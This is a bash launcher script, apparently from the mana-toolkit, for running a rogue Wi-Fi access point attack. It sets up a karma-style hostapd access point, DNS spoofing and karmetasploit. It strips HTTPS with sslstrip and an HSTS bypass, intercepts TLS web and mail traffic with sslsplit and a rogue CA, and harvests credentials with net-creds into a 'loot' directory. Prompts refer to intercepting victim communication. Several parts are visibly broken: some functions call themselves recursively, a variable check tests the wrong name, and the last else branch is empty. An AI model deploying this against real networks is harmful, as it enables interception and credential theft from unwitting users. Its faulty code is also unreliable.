#!/bin/bash

upstream=eth0
phy=wlan0
phy0="$phy_0"

etc=/etc/mana-toolkit
lib=/usr/lib/mana-toolkit
share=/usr/share/mana-toolkit
loot=/var/lib/mana-toolkit

function hostname() {
	hostname WRT54G
	echo hostname WRT54G
	sleep 2
}

function clearwifi() {
	service network-manager stop
	rfkill unblock wlan
}

function macchanger() {
	ifconfig $phy down
	macchanger -r $phy
	ifconfig $phy up
}

function crackapd() {
	crackapd=$share/crackapd/crackapd.py
	# Get the FIFO for the crack stuffs. Create the FIFO and kick of python process
	export EXNODE=`cat $conf | grep ennode | cut -f2 -d"="`
	echo $EXNODE
	mkfifo $EXNODE
	$crackapd&
}

function start_hostapd() {
	hostapd=$lib/hostapd
	conf=$etc/hostapd-karma.conf
	sed -i "s/^interface=.*$/interface=$phy/" $conf
	$hostapd $conf&
	sleep 5
	ifconfig $phy 10.0.0.1 netmask 255.255.255.0
	route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1
}

function start_hostapd_eap() {
	hostapd=$lib/hostapd
	conf=$etc/hostapd-karma-eap.conf
	sed -i "s/^interface=.*$/interface=$phy/" $conf
	sed -i "s/^bss=.*$/bss=$phy0/" $conf
	$hostapd $conf&
	sleep 5
	ifconfig $phy
	ifconfig $phy0
	ifconfig $phy 10.0.0.1 netmask 255.255.255.0
	route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1
	ifconfig $phy0 10.1.0.1 netmask 255.255.255.0
	route add -net 10.1.0.0 netmask 255.255.255.0 gw 10.1.0.1
}

function metasploit() {
	sed -i "s/^set INTERFACE .*$/set INTERFACE $phy/" $etc/karmetasploit.rc
	msfconsole -r $etc/karmetasploit.rc&
}

function dnspoof() {
	dnsspoof -i $phy -f $etc/dnsspoof.conf&
}

function dnspooftwo() {
	dnsspoof -i $phy0 -f $etc/dnsspoof.conf&
}

function apache() {
	service apache2 start
}

function tinyproxy() {
	tinyproxy -c $etc/tinyproxy.conf&
}

function stunnel() {
service stunnel4 start
}

function dhcpd() {
	dhcpd -cf $etc/dhcpd.conf $phy
}

function dhcpdtwo() {
	dhcpd -pf /var/run/dhcpd-two.pid -lf /var/lib/dhcp/dhcpd-two.leases -cf $etc/dhcpd-two.conf $phy0
}

function nat_firewall() {
	echo '1' > /proc/sys/net/ipv4/ip_forward
	iptables --policy INPUT ACCEPT
	iptables --policy FORWARD ACCEPT
	iptables --policy OUTPUT ACCEPT
	iptables -F
	iptables -t nat -F
	iptables -t nat -A POSTROUTING -o $upstream -j MASQUERADE
	iptables -A FORWARD -i $phy -o $upstream -j ACCEPT
	iptables -t nat -A PREROUTING -i $phy -p udp --dport 53 -j DNAT --to 10.0.0.1
	#iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to 192.168.182.1
}

function noup_firewall() {
	echo '1' > /proc/sys/net/ipv4/ip_forward
	iptables --policy INPUT ACCEPT
	iptables --policy FORWARD ACCEPT
	iptables --policy OUTPUT ACCEPT
	iptables -F
	iptables -t nat -F
}

function sslstrip() {
	#SSLStrip with HSTS bypass
	cd $share/sslstrip-hsts/sslstrip2/
	python sslstrip.py -l 10000 -a -w $loot/sslstrip.log.`date "+%s"`&
	iptables -t nat -A PREROUTING -i $phy -p tcp --destination-port 80 -j REDIRECT --to-port 10000
	cd $share/sslstrip-hsts/dns2proxy/
	python dns2proxy.py -i $phy&
	cd -
}

function sslsplit() {
	#SSLSplit
	sslsplit -D -P -Z -S $loot/sslsplit -c $share/cert/rogue-ca.pem -k $share/cert/rogue-ca.key -O -l $loot/sslsplit-connect.log.`date "+%s"` \
	 https 0.0.0.0 10443 \
	 http 0.0.0.0 10080 \
	 ssl 0.0.0.0 10993 \
	 tcp 0.0.0.0 10143 \
	 ssl 0.0.0.0 10995 \
	 tcp 0.0.0.0 10110 \
	 ssl 0.0.0.0 10465 \
	 tcp 0.0.0.0 10025&
	#iptables -t nat -A INPUT -i $phy \
	 #-p tcp --destination-port 80 \
	 #-j REDIRECT --to-port 10080
	iptables -t nat -A PREROUTING -i $phy \
	 -p tcp --destination-port 443 \
	 -j REDIRECT --to-port 10443
	iptables -t nat -A PREROUTING -i $phy \
	 -p tcp --destination-port 143 \
	 -j REDIRECT --to-port 10143
	iptables -t nat -A PREROUTING -i $phy \
	 -p tcp --destination-port 993 \
	 -j REDIRECT --to-port 10993
	iptables -t nat -A PREROUTING -i $phy \
	 -p tcp --destination-port 65493 \
	 -j REDIRECT --to-port 10993
	iptables -t nat -A PREROUTING -i $phy \
	 -p tcp --destination-port 465 \
	 -j REDIRECT --to-port 10465
	iptables -t nat -A PREROUTING -i $phy \
	 -p tcp --destination-port 25 \
	 -j REDIRECT --to-port 10025
	iptables -t nat -A PREROUTING -i $phy \
	 -p tcp --destination-port 995 \
	 -j REDIRECT --to-port 10995
	iptables -t nat -A PREROUTING -i $phy \
	 -p tcp --destination-port 110 \
	 -j REDIRECT --to-port 10110
}

function firelamb() {
	# Start FireLamb
	$share/firelamb/firelamb.py -i $phy &
}

function netcreds() {
	# Start net-creds
	python $share/net-creds/net-creds.py -i $phy > $loot/net-creds.log.`date "+%s"`
}

function hangon() { 
	echo "Hit enter to kill me"
	read
}

function killem() {
	pkill dhcpd
	pkill sslstrip
	pkill dns2proxy
	pkill sslsplit
	pkill hostapd
	pkill dnsspoof
	pkill msfconsole
	rm /tmp/crackapd.run
	rm $EXNODE
	pkill python
	pkill ruby
	service apache2 stop
	service stunnel4 stop
	iptables --policy INPUT ACCEPT
	iptables --policy FORWARD ACCEPT
	iptables --policy OUTPUT ACCEPT
	iptables -t nat -F
}

function testup() {
	passed=0
	echo "Testing whether your chosen upstream interface has an internet connection ..."
	defaultgw="$(netstat -rn|grep 0.0.0.0|grep -oi '[a-z0-9]*$')"
	if [ "${defaultgw}" == "${1}" ]; then
		echo "Good, your chosen interface has a default gateway."
		passed=1
	else
		echo "Uh oh, your default gateway is not on your chosen interface."
		echo "Our test thinks your upstream could be: $defaultgw"
	fi
	ntst="$(ping -c1 8.8.8.8| grep received | sed 's/.*1 packets received.*/1/')"
	if [ "${ntst}" -eq "1" ]; then
		echo "Good, your chosen interface can reach public servers."
		passed=2
	else
		echo "Uh oh, your chosen interface cannot reach public server."
	fi
	if [ "${passed}" -gt "0" ]; then
		echo "Your upstream is working."
	else
		echo "Your upstream isn't working, try fix it, choose another interface, or try no upstream mode."
		exit 2
	fi
}

echo "Do you want to intercept victim communication to the Internet or fake the Internet? (nat/noupstream)"
read type
if [ $output == "nat" ]; then
	echo "You currently have $upstream configured as the interface connected to the Internet, is this correct? If not, specify which interface to use. (y/<interface e.g. wlan1>)"
	read output
	if [ $output != "y" ]; then
		upstream=$output
	fi
	testup	
else
		
fi
		
